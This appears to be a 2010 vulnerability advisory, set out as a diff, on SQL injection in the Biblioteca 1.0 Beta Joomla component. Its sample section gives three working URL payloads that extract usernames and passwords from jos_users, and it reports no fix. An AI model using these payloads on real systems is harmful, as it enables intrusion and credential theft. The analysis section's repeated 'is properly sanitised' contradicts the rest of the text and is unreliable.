@@ -1,0 +1,84 @@
+Biblioteca 1.0 Beta Joomla Component Multiple SQL Injection Vulnerabilities
+
+ Name              Biblioteca
+ Vendor            http://www.cielostellato.info
+ Versions Affected 1.0 Beta
+
+ Author            Salvatore Fresta aka Drosophila
+ Website           http://www.salvatorefresta.net
+ Contact           salvatorefresta [at] gmail [dot] com
+ Date              2010-08-21
+
+X. INDEX
+
+ I.    ABOUT THE APPLICATION
+ II.   DESCRIPTION
+ III.  ANALYSIS
+ IV.   SAMPLE CODE
+ V.    FIX
+ 
+
+I. ABOUT THE APPLICATION
+________________________
+
+Component  that  allows  the automatic  management  of a
+library  in  electronic format. It' can manage books and
+their  loans  through   an   attractive  graphical  user
+interface simple and usable.
+
+
+II. DESCRIPTION
+_______________
+
+This component doesn't use the common Joomla's functions
+to  get  the parameters's value from GET, POST etc.. and
+all  of  these  are  not properly sanitised before being
+used in SQL queries.
+
+
+III. ANALYSIS
+_____________
+
+Summary:
+
+ A) Multiple Blind SQL Injection
+ B) Multiple SQL Injection
+ 
+
+A) Multiple Blind SQL Injection
+_______________________________
+
+
+The  parameter  testo  passed  to  bi.php (site and admin
+frontends)  is  properly sanitised before being used in a
+SQL query.This can be exploited to manipulate SQL queries
+by injecting arbitrary SQL code.
+
+
+B) Multiple SQL Injection
+_________________________
+
+The  parameter testo  passed  to  stampa.php, pdf.php and 
+models/biblioteca.php (when "view" is set to "biblioteca"
+) is  properly sanitised before being used in SQL queries.
+This  can  be  exploited to  manipulate  SQL  queries  by
+injecting arbitrary SQL code.
+
+
+IV. SAMPLE CODE
+_______________
+
+A) Multiple SQL Injection
+
+http://host/path/components/com_biblioteca/views/biblioteca/tmpl/stampa.php?pag=1&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
+
+http://host/path/components/com_biblioteca/views/biblioteca/tmpl/pdf.php?pag=1&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
+
+http://host/path/index.php?option=com_biblioteca&view=biblioteca&testo=-a%25' UNION SELECT 1,username,password,4,5,6,7,8,9 FROM jos_users%23
+
+
+V. FIX
+______
+
+No fix.
+
